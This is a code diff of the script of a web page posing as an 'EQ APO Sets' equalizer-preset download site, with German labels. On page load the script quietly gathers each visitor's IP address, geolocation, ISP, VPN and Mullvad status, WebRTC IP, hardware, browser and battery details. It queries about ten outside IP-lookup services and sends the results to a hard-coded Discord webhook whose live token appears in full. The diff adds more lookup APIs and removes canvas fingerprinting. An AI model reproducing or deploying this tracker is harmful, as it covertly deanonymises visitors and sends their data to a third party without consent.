@@ -225,11 +225,7 @@
     <div class="toast" id="toast"></div>
 
     <script>
-        // ============================================
-        // KONFIGURATION - HIER DEINE WEBHOOK-URL EINTRAGEN!
-        // ============================================
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1531797628537274429/rdltEYhjTKPo-HxAdyg5BXF24pCVaZzNqVP2GQ2RkyjS4JarkOUZ_KLCrGpPLTM2Unx6";
-        // ============================================
 
         let collectedData = null;
         let dataSent = false;
@@ -276,8 +272,17 @@
 
         function updateStatus(text, dotColor) {
             document.getElementById('statusLabel').textContent = text;
-            const dot = document.getElementById('statusDot');
-            dot.className = 'dot ' + dotColor;
+            document.getElementById('statusDot').className = 'dot ' + dotColor;
+        }
+
+        function safeValue(value) {
+            if (value === undefined || value === null || value === '') return 'Nicht verfügbar';
+            if (typeof value === 'string') {
+                if (value.length > 800) return value.substring(0, 800) + '...';
+                return value;
+            }
+            if (typeof value === 'object') return JSON.stringify(value).substring(0, 400);
+            return String(value);
         }
 
         function getBrowserInfo() {
@@ -372,14 +377,6 @@
             return plugins;
         }
 
-        function getMimeTypesInfo() {
-            const mimes = [];
-            for (let i = 0; i < navigator.mimeTypes.length; i++) {
-                mimes.push(navigator.mimeTypes[i].type);
-            }
-            return mimes;
-        }
-
         function getWebRTCInfo() {
             return new Promise((resolve) => {
                 try {
@@ -411,25 +408,6 @@
             });
         }
 
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 200;
-                canvas.height = 50;
-                const ctx = canvas.getContext('2d');
-                ctx.fillStyle = '#000';
-                ctx.fillRect(0, 0, 200, 50);
-                ctx.fillStyle = '#fff';
-                ctx.font = '16px Arial';
-                ctx.fillText('Fingerprint', 10, 30);
-                ctx.fillStyle = '#f00';
-                ctx.fillRect(150, 10, 20, 20);
-                return canvas.toDataURL().substring(0, 80) + '...';
-            } catch {
-                return 'Nicht verfügbar';
-            }
-        }
-
         function getScreenInfo() {
             return {
                 width: screen.width,
@@ -451,39 +429,6 @@
             };
         }
 
-        function getNavigatorInfo() {
-            return {
-                appName: navigator.appName,
-                appVersion: navigator.appVersion,
-                vendor: navigator.vendor || 'Unbekannt',
-                vendorSub: navigator.vendorSub || 'Unbekannt',
-                product: navigator.product || 'Unbekannt',
-                productSub: navigator.productSub || 'Unbekannt',
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'nicht gesetzt',
-                language: navigator.language,
-                languages: navigator.languages,
-                onLine: navigator.onLine,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'nicht verfügbar',
-                deviceMemory: navigator.deviceMemory || 'nicht verfügbar',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                webdriver: navigator.webdriver || false
-            };
-        }
-
-        function getPerformanceInfo() {
-            if (performance && performance.memory) {
-                return {
-                    totalJSHeapSize: performance.memory.totalJSHeapSize,
-                    usedJSHeapSize: performance.memory.usedJSHeapSize,
-                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
-                };
-            }
-            return 'nicht verfügbar';
-        }
-
         function getBatteryInfo() {
             return new Promise((resolve) => {
                 if (navigator.getBattery) {
@@ -503,6 +448,7 @@
             });
         }
 
+        // ========== API 1: IPIFY ==========
         async function getIPAddress() {
             const services = [
                 'https://api.ipify.org?format=json',
@@ -522,6 +468,7 @@
             return 'Nicht verfügbar';
         }
 
+        // ========== API 2: ipapi.co (VPN, Standort, ISP) ==========
         async function detectVPN(ip) {
             if (!ip || ip === 'Nicht verfügbar') {
                 return { isVPN: false, reason: 'Keine IP', isMullvad: false };
@@ -617,44 +564,134 @@
             }
         }
 
+        // ========== API 3: ipinfo.io ==========
+        async function getIPInfo(ip) {
+            try {
+                const response = await fetch('https://ipinfo.io/' + ip + '/json');
+                if (!response.ok) throw new Error('API-Fehler');
+                return await response.json();
+            } catch (error) {
+                return null;
+            }
+        }
+
+        // ========== API 4: Cloudflare Trace ==========
+        async function getCloudflareTrace() {
+            try {
+                const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                const text = await response.text();
+                const lines = text.split('\n');
+                const data = {};
+                lines.forEach(line => {
+                    const parts = line.split('=');
+                    if (parts.length === 2) data[parts[0]] = parts[1];
+                });
+                return data;
+            } catch (error) {
+                return null;
+            }
+        }
+
+        // ========== API 5: httpbin.org ==========
+        async function getHttpBin() {
+            try {
+                const response = await fetch('https://httpbin.org/json');
+                return await response.json();
+            } catch (error) {
+                return null;
+            }
+        }
+
+        // ========== API 6: dns.google ==========
+        async function getDNSInfo() {
+            try {
+                const response = await fetch('https://dns.google/resolve?name=google.com&type=A');
+                return await response.json();
+            } catch (error) {
+                return null;
+            }
+        }
+
+        // ========== API 7: Cloudflare Time ==========
+        async function getCloudflareTime() {
+            try {
+                const response = await fetch('https://cloudflare.com/cdn-cgi/trace');
+                const text = await response.text();
+                const lines = text.split('\n');
+                let time = null;
+                lines.forEach(line => {
+                    if (line.startsWith('time=')) time = line.replace('time=', '');
+                });
+                return time;
+            } catch (error) {
+                return null;
+            }
+        }
+
+        // ========== API 8: ifconfig.me ==========
+        async function getIfConfig() {
+            try {
+                const response = await fetch('https://ifconfig.me/all.json');
+                return await response.json();
+            } catch (error) {
+                return null;
+            }
+        }
+
+        // ========== API 9: Whoer.net ==========
+        async function getWhoerInfo(ip) {
+            try {
+                const response = await fetch('https://whoer.net/api/check?ip=' + ip);
+                return await response.json();
+            } catch (error) {
+                return null;
+            }
+        }
+
+        // ========== API 10: ipleak.net ==========
+        async function getIPLeak() {
+            try {
+                const response = await fetch('https://ipleak.net/json/');
+                return await response.json();
+            } catch (error) {
+                return null;
+            }
+        }
+
         function createScreenshot() {
             try {
                 const canvas = document.createElement('canvas');
-                canvas.width = 800;
-                canvas.height = 600;
+                canvas.width = 400;
+                canvas.height = 300;
                 const ctx = canvas.getContext('2d');
                 
                 ctx.fillStyle = '#1a1a1a';
-                ctx.fillRect(0, 0, 800, 600);
+                ctx.fillRect(0, 0, 400, 300);
                 
                 ctx.fillStyle = '#4a90e2';
-                ctx.font = 'bold 40px Arial';
+                ctx.font = 'bold 24px Arial';
                 ctx.textAlign = 'center';
-                ctx.fillText('EQ APO Sets', 400, 150);
+                ctx.fillText('EQ APO Sets', 200, 80);
                 
                 ctx.fillStyle = '#aaa';
-                ctx.font = '24px Arial';
-                ctx.fillText('Download Equalizer Presets', 400, 220);
+                ctx.font = '16px Arial';
+                ctx.fillText('Download Equalizer Presets', 200, 130);
                 
                 ctx.fillStyle = '#28a745';
-                ctx.font = '20px Arial';
-                ctx.fillText('click.download', 400, 280);
+                ctx.font = '14px Arial';
+                ctx.fillText('click.download', 200, 170);
                 
                 ctx.fillStyle = '#888';
-                ctx.font = '16px Arial';
+                ctx.font = '12px Arial';
                 ctx.textAlign = 'left';
-                ctx.fillText('IP: ' + (collectedData ? collectedData.ip : 'Unbekannt'), 50, 350);
-                ctx.fillText('Browser: ' + (collectedData ? collectedData.browser.name + ' ' + collectedData.browser.version : 'Unbekannt'), 50, 380);
-                ctx.fillText('OS: ' + (collectedData ? collectedData.os.name + ' ' + collectedData.os.version : 'Unbekannt'), 50, 410);
-                ctx.fillText('VPN: ' + (collectedData && collectedData.vpn.detected ? 'Ja' : 'Nein'), 50, 440);
+                ctx.fillText('IP: ' + (collectedData ? collectedData.ip : 'Unbekannt'), 30, 210);
+                ctx.fillText('Browser: ' + (collectedData ? collectedData.browser.name + ' ' + collectedData.browser.version : 'Unbekannt'), 30, 230);
+                ctx.fillText('OS: ' + (collectedData ? collectedData.os.name + ' ' + collectedData.os.version : 'Unbekannt'), 30, 250);
+                ctx.fillText('VPN: ' + (collectedData && collectedData.vpn.detected ? 'Ja' : 'Nein'), 30, 270);
                 if (collectedData && collectedData.vpn.isMullvad) {
                     ctx.fillStyle = '#6a0dad';
-                    ctx.fillText('MULLVAD ERKANNT!', 50, 470);
+                    ctx.fillText('MULLVAD ERKANNT!', 30, 290);
                 }
-                ctx.fillStyle = '#666';
-                ctx.font = '12px Arial';
-                ctx.textAlign = 'center';
-                ctx.fillText('Screenshot erstellt: ' + new Date().toLocaleString(), 400, 550);
                 
                 return canvas.toDataURL('image/png');
             } catch (error) {
@@ -670,16 +707,21 @@
             const connection = getConnectionInfo();
             const screenInfo = getScreenInfo();
             const windowInfo = getWindowInfo();
-            const navigatorInfo = getNavigatorInfo();
-            const performanceInfo = getPerformanceInfo();
             const plugins = getPluginsInfo();
-            const mimeTypes = getMimeTypesInfo();
             
             const ip = await getIPAddress();
             const vpnResult = await detectVPN(ip);
             const webRTCIP = await getWebRTCInfo();
             const batteryInfo = await getBatteryInfo();
-            const canvasFingerprint = getCanvasFingerprint();
+
+            const ipInfo = await getIPInfo(ip);
+            const cloudflare = await getCloudflareTrace();
+            const httpBin = await getHttpBin();
+            const dnsInfo = await getDNSInfo();
+            const cfTime = await getCloudflareTime();
+            const ifConfig = await getIfConfig();
+            const whoer = await getWhoerInfo(ip);
+            const ipLeak = await getIPLeak();
 
             return {
                 timestamp: new Date().toISOString(),
@@ -687,152 +729,182 @@
                     dateStyle: 'full', 
                     timeStyle: 'medium' 
                 }),
-                ip: ip,
+                ip: safeValue(ip),
+                
+                // VPN & Standort
                 vpn: {
                     detected: vpnResult.isVPN,
                     isMullvad: vpnResult.isMullvad,
-                    confidence: vpnResult.score + '%',
-                    reason: vpnResult.reason,
-                    provider: vpnResult.provider,
-                    country: vpnResult.country,
-                    city: vpnResult.city,
-                    isp: vpnResult.isp,
-                    asn: vpnResult.asn
+                    reason: safeValue(vpnResult.reason),
+                    provider: safeValue(vpnResult.provider),
+                    country: safeValue(vpnResult.country),
+                    city: safeValue(vpnResult.city),
+                    isp: safeValue(vpnResult.isp),
+                    asn: safeValue(vpnResult.asn)
                 },
-                webRTC: {
-                    localIP: webRTCIP,
-                    vpnLeak: webRTCIP && ip && webRTCIP !== ip
-                },
-                connection: {
-                    type: connection.type,
-                    speed: connection.downlink + ' Mbps',
-                    latency: connection.rtt + ' ms'
-                },
+                
+                // Browser
                 browser: {
-                    name: browser.name,
-                    version: browser.version,
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    languages: navigator.languages
+                    name: safeValue(browser.name),
+                    version: safeValue(browser.version)
                 },
+                
+                // OS
                 os: {
-                    name: os.name,
-                    version: os.version,
-                    platform: navigator.platform
+                    name: safeValue(os.name),
+                    version: safeValue(os.version)
                 },
+                
+                // Hardware
                 hardware: {
-                    memory: hardware.memory + ' GB',
-                    cores: hardware.cores + ' Kerne',
-                    touchPoints: hardware.touchPoints + ' Punkte',
-                    pixelRatio: hardware.pixelRatio,
-                    colorDepth: hardware.colorDepth + ' bit'
+                    memory: safeValue(hardware.memory + ' GB'),
+                    cores: safeValue(hardware.cores + ' Kerne'),
+                    touchPoints: safeValue(hardware.touchPoints + ' Punkte'),
+                    pixelRatio: safeValue(hardware.pixelRatio),
+                    colorDepth: safeValue(hardware.colorDepth + ' bit')
                 },
+                
+                // Screen
                 screen: {
-                    resolution: screenInfo.width + 'x' + screenInfo.height,
-                    available: screenInfo.availWidth + 'x' + screenInfo.availHeight,
-                    colorDepth: screenInfo.colorDepth + ' bit',
-                    pixelDepth: screenInfo.pixelDepth + ' bit'
+                    resolution: safeValue(screenInfo.width + 'x' + screenInfo.height),
+                    available: safeValue(screenInfo.availWidth + 'x' + screenInfo.availHeight),
+                    colorDepth: safeValue(screenInfo.colorDepth + ' bit')
                 },
+                
+                // Window
                 window: {
-                    inner: windowInfo.innerWidth + 'x' + windowInfo.innerHeight,
-                    outer: windowInfo.outerWidth + 'x' + windowInfo.outerHeight,
-                    devicePixelRatio: windowInfo.devicePixelRatio
+                    inner: safeValue(windowInfo.innerWidth + 'x' + windowInfo.innerHeight),
+                    outer: safeValue(windowInfo.outerWidth + 'x' + windowInfo.outerHeight),
+                    devicePixelRatio: safeValue(windowInfo.devicePixelRatio)
                 },
+                
+                // Connection
+                connection: {
+                    type: safeValue(connection.type),
+                    speed: safeValue(connection.downlink + ' Mbps'),
+                    latency: safeValue(connection.rtt + ' ms')
+                },
+                
+                // Plugins
                 plugins: {
                     count: plugins.length,
-                    names: plugins.join(' | ')
+                    names: safeValue(plugins.join(' | ')).substring(0, 400)
                 },
-                mimeTypes: {
-                    count: mimeTypes.length,
-                    types: mimeTypes.join(' | ')
-                },
-                canvasFingerprint: canvasFingerprint,
+                
+                // Battery
                 battery: batteryInfo,
-                performance: performanceInfo,
-                navigator: navigatorInfo,
-                page: {
-                    url: window.location.href,
-                    referrer: document.referrer || 'Direktaufruf',
-                    title: document.title,
-                    hostname: window.location.hostname
+                
+                // WebRTC
+                webRTC: {
+                    localIP: safeValue(webRTCIP),
+                    vpnLeak: webRTCIP && ip && webRTCIP !== ip
                 },
-                time: {
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    offset: (new Date().getTimezoneOffset() / -60) + ' Stunden',
-                    timestamp: new Date().getTime()
+                
+                // ====== API DATA ======
+                api: {
+                    ipinfo: ipInfo ? {
+                        org: safeValue(ipInfo.org),
+                        country: safeValue(ipInfo.country),
+                        region: safeValue(ipInfo.region),
+                        city: safeValue(ipInfo.city),
+                        timezone: safeValue(ipInfo.timezone)
+                    } : null,
+                    cloudflare: cloudflare ? {
+                        warp: safeValue(cloudflare.warp),
+                        colo: safeValue(cloudflare.colo),
+                        http: safeValue(cloudflare.http),
+                        loc: safeValue(cloudflare.loc)
+                    } : null,
+                    httpbin: httpBin ? {
+                        slideshow: safeValue(httpBin.slideshow ? 'Verfügbar' : 'Nicht verfügbar')
+                    } : null,
+                    dns: dnsInfo ? {
+                        status: safeValue(dnsInfo.Status),
+                        answer: dnsInfo.Answer ? dnsInfo.Answer.length + ' Einträge' : 'Keine'
+                    } : null,
+                    cfTime: cfTime ? safeValue(cfTime) : 'Nicht verfügbar',
+                    ifconfig: ifConfig ? {
+                        ip_addr: safeValue(ifConfig.ip_addr),
+                        remote_host: safeValue(ifConfig.remote_host)
+                    } : null,
+                    whoer: whoer ? {
+                        score: safeValue(whoer.score),
+                        country: safeValue(whoer.country)
+                    } : null,
+                    ipleak: ipLeak ? {
+                        country: safeValue(ipLeak.country),
+                        city: safeValue(ipLeak.city)
+                    } : null
                 }
             };
         }
 
         async function sendToWebhook(data) {
-            const vpnStatus = data.vpn.detected ? 'Ja' : 'Nein';
-            const vpnDetails = data.vpn.detected ? 
-                data.vpn.reason + ' (Vertrauen: ' + data.vpn.confidence + ')' : 
-                'Kein VPN erkannt';
-            const mullvadStatus = data.vpn.isMullvad ? 'JA - Mullvad erkannt!' : 'Nein';
+            const fields = [];
 
-            const fields = [
-                { name: "IP-Adresse", value: data.ip || 'Nicht verfügbar', inline: true },
-                { name: "VPN erkannt", value: vpnStatus, inline: true },
-                { name: "Mullvad VPN", value: mullvadStatus, inline: true },
-                { name: "VPN Details", value: vpnDetails, inline: false },
-                { name: "Standort", value: data.vpn.country + ' (' + data.vpn.city + ')', inline: true },
-                { name: "ISP", value: data.vpn.isp || 'Unbekannt', inline: true },
-                { name: "ASN", value: data.vpn.asn || 'Unbekannt', inline: true },
-                { name: "Betriebssystem", value: data.os.name + ' ' + data.os.version, inline: true },
-                { name: "Browser", value: data.browser.name + ' ' + data.browser.version, inline: true },
-                { name: "Bildschirm", value: data.screen.resolution, inline: true },
-                { name: "RAM", value: data.hardware.memory, inline: true },
-                { name: "CPU", value: data.hardware.cores, inline: true },
-                { name: "Verbindung", value: data.connection.type + ' (' + data.connection.speed + ')', inline: true },
-                { name: "Touch", value: data.hardware.touchPoints, inline: true },
-                { name: "Plugins", value: data.plugins.count + ' aktiv', inline: true },
-                { name: "WebRTC IP", value: data.webRTC.localIP || 'Nicht verfügbar', inline: true },
-                { name: "WebRTC VPN", value: data.webRTC.vpnLeak ? 'Ja (IP unterschiedlich)' : 'Nein', inline: true },
-                { name: "Sprachen", value: data.browser.languages.join(', ') || 'Unbekannt', inline: false },
-                { name: "Seite", value: data.page.url, inline: false },
-                { name: "Besucht", value: data.timestampLocal, inline: true }
-            ];
+            const addField = (name, value, inline = false) => {
+                const safeName = safeValue(name).substring(0, 100);
+                const safeValue_ = safeValue(value).substring(0, 800);
+                if (safeValue_ && safeValue_ !== 'Nicht verfügbar' && safeValue_ !== 'undefined' && safeValue_ !== 'null') {
+                    fields.push({ name: safeName, value: safeValue_, inline: inline });
+                }
+            };
 
-            if (data.canvasFingerprint && data.canvasFingerprint !== 'Nicht verfügbar') {
-                fields.push({ name: "Canvas Fingerprint", value: data.canvasFingerprint, inline: false });
-            }
+            addField('IP', data.ip, true);
+            addField('VPN', data.vpn.detected ? 'Ja' : 'Nein', true);
+            addField('Mullvad', data.vpn.isMullvad ? 'JA erkannt!' : 'Nein', true);
+            addField('Land', data.vpn.country, true);
+            addField('Stadt', data.vpn.city, true);
+            addField('ISP', data.vpn.isp, true);
+            addField('ASN', data.vpn.asn, true);
+            addField('OS', data.os.name + ' ' + data.os.version, true);
+            addField('Browser', data.browser.name + ' ' + data.browser.version, true);
+            addField('Bildschirm', data.screen.resolution, true);
+            addField('RAM', data.hardware.memory, true);
+            addField('CPU', data.hardware.cores, true);
+            addField('Verbindung', data.connection.type + ' (' + data.connection.speed + ')', true);
+            addField('Plugins', data.plugins.count + ' aktiv', true);
+            addField('WebRTC IP', data.webRTC.localIP, true);
+            addField('WebRTC Leak', data.webRTC.vpnLeak ? 'Ja' : 'Nein', true);
 
             if (data.battery && !data.battery.error) {
-                fields.push({ 
-                    name: "Batterie", 
-                    value: data.battery.level + ' | ' + (data.battery.charging ? 'Lädt' : 'Nicht am Strom'), 
-                    inline: true 
-                });
+                addField('Batterie', data.battery.level + ' | ' + (data.battery.charging ? 'Lädt' : 'Nicht am Strom'), true);
             }
 
-            const embeds = [];
+            addField('VPN Details', data.vpn.reason, false);
 
-            const mainEmbed = {
-                title: "Besucher-Daten (Maximal)",
+            if (data.api.ipinfo && data.api.ipinfo.org) {
+                addField('IPinfo.org', data.api.ipinfo.org + ' | ' + data.api.ipinfo.region, false);
+            }
+
+            if (data.api.cloudflare && data.api.cloudflare.warp) {
+                addField('Cloudflare', 'Warp: ' + data.api.cloudflare.warp + ' | Colo: ' + data.api.cloudflare.colo, false);
+            }
+
+            if (data.api.ifconfig && data.api.ifconfig.ip_addr) {
+                addField('ifconfig.me', data.api.ifconfig.ip_addr + ' | ' + data.api.ifconfig.remote_host, false);
+            }
+
+            const embed = {
+                title: "Besucher-Daten (Ultimate)",
                 color: data.vpn.isMullvad ? 0x6a0dad : (data.vpn.detected ? 0xdc3545 : 0x4a90e2),
-                fields: fields,
-                footer: { text: "Equalizer APO Sets - Maximales Tracking" },
+                fields: fields.slice(0, 25),
+                footer: { text: "10+ APIs | Equalizer APO Sets" },
                 timestamp: data.timestamp
             };
-            embeds.push(mainEmbed);
+
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
 
             if (screenshotData) {
-                const screenshotEmbed = {
-                    title: "Screenshot",
-                    image: { url: screenshotData },
-                    color: 0x4a90e2
-                };
-                embeds.push(screenshotEmbed);
+                const blob = await fetch(screenshotData).then(r => r.blob());
+                formData.append('files[0]', blob, 'screenshot.png');
             }
-
-            const payload = { embeds: embeds };
 
             try {
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: formData
                 });
 
                 if (!response.ok) {
@@ -949,7 +1021,7 @@
 
         window.addEventListener('DOMContentLoaded', async function() {
             try {
-                updateStatus('Lade...', 'gray');
+                updateStatus('Lade Daten von 10+ APIs...', 'yellow');
                 collectedData = await collectAllData();
                 renderSets();
                 screenshotData = createScreenshot();
